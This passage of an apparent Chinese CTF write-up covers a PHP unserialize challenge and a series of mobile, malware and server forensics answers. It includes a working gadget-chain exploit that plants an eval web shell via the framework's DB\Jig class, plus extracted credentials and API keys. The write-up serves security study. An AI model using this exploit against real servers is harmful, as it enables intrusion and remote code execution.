class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>直接将GET请求的<code>payload</code>参数反序列化, 搜索<code>__destruct</code></p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182436949.png" alt="__destruct()"></p>
+<p><code>DBJig</code>类中的<code>__destruct</code>方法代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">.... <span class="comment">// 省略</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazy) &#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;lazy = <span class="literal">FALSE</span>;</span><br><span class="line">			<span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;data?:[] <span class="keyword">as</span> <span class="variable">$file</span> =&gt; <span class="variable">$data</span>)</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$file</span>,<span class="variable">$data</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如果<code>$this-&gt;lazy</code> 为True, 那么就会进入<code>$this-&gt;write</code>函数，此函数参数来源<code>$this-&gt;data</code>这个数组，</p>
+<p>key为文件名，value为数据，跟进查看<code>$this-&gt;write</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$file</span>,<span class="keyword">array</span> <span class="variable">$data</span>=<span class="literal">NULL</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;dir || <span class="variable language_">$this</span>-&gt;lazy)</span><br><span class="line">			<span class="keyword">return</span> <span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;data[<span class="variable">$file</span>]=<span class="variable">$data</span>);</span><br><span class="line">		<span class="variable">$fw</span>=<span class="title class_">\Base</span>::<span class="title function_ invoke__">instance</span>();</span><br><span class="line">		<span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;format) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="built_in">self</span>::<span class="variable constant_">FORMAT_JSON</span>:</span><br><span class="line">				<span class="variable">$out</span>=<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>,JSON_PRETTY_PRINT);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="built_in">self</span>::<span class="variable constant_">FORMAT_Serialized</span>:</span><br><span class="line">				<span class="variable">$out</span>=<span class="variable">$fw</span>-&gt;<span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$fw</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;dir.<span class="variable">$file</span>,<span class="variable">$out</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>$this-&gt;dir</code>为空，或者<code>$this-&gt;lazy</code>为<code>TRUE</code>，则返回<code>count($this-&gt;data[$file]=$data)</code>。因为在上面<code>__destruct</code>函数的流程中已经将<code>$this-&gt;lazy</code>设置为FALSE了，所以，我们只需要满足<code>$this-&gt;dir</code>不为空即可。接着看switch循环，<code>$this-&gt;format</code>为<code>0</code>则进入<code>json_encode</code>，<code>1</code>则进入<code>serialize</code>。因此我们设置<code>$this-&gt;format</code>为0即可，接着调用<code>Base::instance()</code>类的<code>write</code>方法，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span>,<span class="variable">$append</span>=<span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$data</span>,<span class="variable">$this</span>-&gt;hive[<span class="string">&#x27;LOCK&#x27;</span>]|(<span class="variable">$append</span>?<span class="attr">FILE_APPEND</span>:<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用了<code>file_put_contents</code>来写文件。分析就此，构造exp如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">DB</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jig</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span></span><br><span class="line">        FORMAT_JSON=<span class="number">0</span>,</span><br><span class="line">        FORMAT_Serialized=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$uuid</span>, <span class="variable">$dir</span>, <span class="variable">$format</span>, <span class="variable">$log</span>, <span class="variable">$data</span>, <span class="variable">$lazy</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lazy=<span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data=[<span class="string">&quot;1.php&quot;</span>=&gt;[<span class="string">&quot;&lt;?php @eval(\$_POST[cmd]);?&gt;&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;format=<span class="built_in">self</span>::<span class="variable constant_">FORMAT_Serialized</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dir=<span class="string">&quot;/var/www/html/lib/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Jig</span>()));</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：默认的路劲<code>/var/www/html/</code>无写权限,所以这里我们需要指定路劲</p>
+<p>当然，<code>./lib</code>也是可以的</p>
+</blockquote>
+<p>访问<code>/lib/1.php</code></p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183710382.png"></p>
+<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证_1"></a>手机取证_1</h3><p><strong>题目：iPhone手机的iBoot固件版本号:（答案参考格式：iBoot-1.1.1）</strong></p>
+<p>使用盘古石手机取证分析系统导入iphone手机的zip文件,在设备信息一栏可以看到手机的iBoot固件版本号</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175232682.png"></p>
+<p>flag:iBoot-7429.62.1</p>
+<h3 id="手机取证-2"><a href="#手机取证-2" class="headerlink" title="手机取证_2"></a>手机取证_2</h3><p><strong>题目：该手机制作完备份UTC+8的时间（非提取时间）:（答案参考格式：2000-01-01 00:00:00）</strong></p>
+<p>打开iphone7.zip,修改日期即为手机制作完备份的时间</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175508502.png"></p>
+<p>flag:2022-01-11 18:47:38</p>
+<h3 id="exe分析-1"><a href="#exe分析-1" class="headerlink" title="exe分析_1"></a>exe分析_1</h3><p> 将services.exe上传到微步云沙箱（<a target="_blank" rel="noopener" href="https://s.threatbook.com/%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E4%B8%80%E6%A0%8F%E6%9F%A5%E7%9C%8B%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%EF%BC%8C%E5%B9%B6%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E8%AF%A6%E6%83%85%E5%BE%97%E7%9F%A5%E5%88%9B%E5%BB%BA%E4%BA%86C:/Program">https://s.threatbook.com/）进行检测，可以在动态分析一栏查看执行流程图，并查看进程详情得知创建了C:\Program</a> Files\Common Files\Services\WmiApSvr.exe来执行</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175252073.png"></p>
+<h3 id="exe分析-2"><a href="#exe分析-2" class="headerlink" title="exe分析_2"></a>exe分析_2</h3><p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184120510.png"></p>
+<p>PE分析，发现<code>HackTool.FlyStudio.acz_unpack.exe</code>调用了<code>advapi32.dll</code></p>
+<h3 id="Exe分析-3"><a href="#Exe分析-3" class="headerlink" title="Exe分析_3"></a>Exe分析_3</h3><p> 将aspnet_wp.v.exe上传到微步云沙箱（<a target="_blank" rel="noopener" href="https://s.threatbook.com/%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E4%B8%80%E6%A0%8F%E6%9F%A5%E7%9C%8B%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E6%89%A7%E8%A1%8C%E5%90%8E%E5%90%AF%E5%8A%A8%E7%9A%84%E8%BF%9B%E7%A8%8B%E6%98%AFsvchost.exe">https://s.threatbook.com/）进行检测，可以在动态分析一栏查看执行流程图，可以发现执行后启动的进程是svchost.exe</a></p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175319005.png"></p>
+<h3 id="Exe分析-4"><a href="#Exe分析-4" class="headerlink" title="Exe分析_4"></a>Exe分析_4</h3><p>将exe上传到VT（<a target="_blank" rel="noopener" href="https://www.virustotal.com/%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F%EF%BC%8C%E4%BB%8E%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C%E7%9A%84%E5%85%B3%E9%94%AE%E8%AF%8D%E4%B8%AD%E5%8F%AF%E7%9F%A5%E6%98%AF%E6%8C%96%E7%9F%BF%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%97%85%E6%AF%92">https://www.virustotal.com/）进行扫描，从扫描结果的关键词中可知是挖矿类型的病毒</a></p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175510599.png"></p>
+<h3 id="exe分析-5"><a href="#exe分析-5" class="headerlink" title="exe分析_5"></a>exe分析_5</h3><p>将exe上传到微步云沙箱（<a target="_blank" rel="noopener" href="https://s.threatbook.com/%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E4%B8%80%E6%A0%8F%E6%9F%A5%E7%9C%8B%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%9C%89%E4%B8%80%E4%B8%AA%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E8%A1%8C%E4%B8%BA%EF%BC%8CIP%E6%98%AF**220.86.87.232**%EF%BC%8C">https://s.threatbook.com/）进行检测，可以在动态分析一栏查看执行流程图，可以看到有一个网络连接行为，IP是**220.86.87.232**，</a><br><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175651779.png"></p>
+<p>查询ip的归属地是韩国<br><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175742508.png"></p>
+<h3 id="APK分析-02"><a href="#APK分析-02" class="headerlink" title="APK分析_02"></a>APK分析_02</h3><p>将APK反编译后找到MainActivity，可以发现有一串base64字符串：aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180150225.png"></p>
+<p>将其解密，得到服务器地址：ansjk.ecxeio.xyz</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180332104.png"></p>
+<h3 id="APK分析-03"><a href="#APK分析-03" class="headerlink" title="APK分析_03"></a>APK分析_03</h3><p>在MainActivity可发现，import p061d.p062a.p063a.AbstractActivityC0773h;这行代码，跟入这个<br><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180516999.png"></p>
+<p>查看回上图提供服务器地址的函数是mo4758t()，在这段代码中的第7行找到了调用，this.f3118q.loadUrl(mo4758t());所以加载服务器的函数是：loadUrl<br><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180700265.png"></p>
+<h3 id="APK分析-05"><a href="#APK分析-05" class="headerlink" title="APK分析_05"></a>APK分析_05</h3><p>根据APK分析_06题的题干可知，首先得有安全检测行为才能寻找检测方法，所以选择是<br><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181012712.png"></p>
+<h3 id="APK分析-07"><a href="#APK分析-07" class="headerlink" title="APK分析_07"></a>APK分析_07</h3><p>反编译，发现三个View视图</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184256493.png"></p>
+<p>flag为<code>3</code></p>
+<h3 id="APK分析-08"><a href="#APK分析-08" class="headerlink" title="APK分析_08"></a>APK分析_08</h3><p><strong>题目：受害人手机中红星IPA的包名是:（答案参考格式：a.s.d）</strong></p>
+<p>在盘古石计算机取证分析系统中把红星.ipa下到本地来</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182015391.png"></p>
+<p>修改为zip后解压得到文件夹</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182239159.png"></p>
+<p>在文件夹内搜索Info.plist打开</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182710798.png"></p>
+<p>在Info.plist里搜索CFBundleIdentifier得到包名</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182752286.png"></p>
+<p>flag:com.dd666.hongxin</p>
+<h3 id="APK分析-09"><a href="#APK分析-09" class="headerlink" title="APK分析_09"></a>APK分析_09</h3><p><strong>题目：受害人手机中红星IPA的APIKEY是:（答案参考格式：asd）</strong></p>
+<p>在info.plist里面搜索APIKEY关键字得到flag</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183125194.png"></p>
+<p>flag:d395159c291c627c9d4ff9139bf8f0a700b98732</p>
+<h3 id="APK分析-11"><a href="#APK分析-11" class="headerlink" title="APK分析_11"></a>APK分析_11</h3><p><strong>题目：嫌疑人手机中红星APK的服务器地址是:（答案参考格式：ass.a.d:11）</strong></p>
+<p>使用在线apk信息解密得到红星APK的服务器地址</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183555001.png"></p>
+<p>flag:<a target="_blank" rel="noopener" href="http://www.nansjy.com.cn:8161/">http://www.nansjy.com.cn:8161</a></p>
+<h3 id="APK分析-12"><a href="#APK分析-12" class="headerlink" title="APK分析_12"></a>APK分析_12</h3><p><strong>题目:嫌疑人手机中红星APK的程序入口是:（答案参考格式：a.v.b.n）</strong></p>
+<p>使用jadx-gui导入红星APK程序,打开AndroidManifest.xml</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183954273.png"></p>
+<p>搜索LAUNCHER上面active的android:name既为程序的入口</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184055576.png"></p>
+<p>flag:com.example.weisitas526sad.activity.SplashActivity</p>
+<h3 id="APK分析-15"><a href="#APK分析-15" class="headerlink" title="APK分析_15"></a>APK分析_15</h3><p>压缩包工具解压<code>手机流量包.saz</code>, 使用<code>grep</code>查找<code>password</code>字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rin <span class="string">&quot;password&quot;</span> ./raw/*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184639469.png"></p>
+<p>flag为<code>17317289056/b12345678b</code></p>
+<h3 id="服务器取证-04"><a href="#服务器取证-04" class="headerlink" title="服务器取证_04"></a>服务器取证_04</h3><p>导入嫌疑人的服务器检材进行计算机取证，将其中linux服务器的www文件夹先导出<br><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181523060.png"></p>
+<p>在相对路径www\server\panel\logs\request中可以找到宝塔面板的访问日志，在以下文件中选择时间最早的解压查看<br><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181635301.png"></p>
+<p>最早一次对&#x2F;login路径发送post包的时间也就是最早登录时间，flag值：2021-05-17 16:10:40<br><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181842265.png"></p>
+<h3 id="服务器取证-07"><a href="#服务器取证-07" class="headerlink" title="服务器取证_07"></a>服务器取证_07</h3><p>服务器的访问日志在相对路径www\wwwlogs\access.log文件中，找到最早访问后台的IP是：183.160.76.194<br><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182234733.png"></p>
+<h3 id="服务器取证-14"><a href="#服务器取证-14" class="headerlink" title="服务器取证_14"></a>服务器取证_14</h3><p><strong>题目：统计涉案网站哪一天登录的会员人数最多。（答案参考格式：1999-09-09）</strong></p>
+<p>使用仿真系统挂载到本地后查看Larvel的默认配置路径,里面有数据库的账号和密码</p>
+<p>cat &#x2F;www&#x2F;wwwroot&#x2F;v9.licai.com&#x2F;.env</p>
+<p><img src="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804190232311.png"></p>
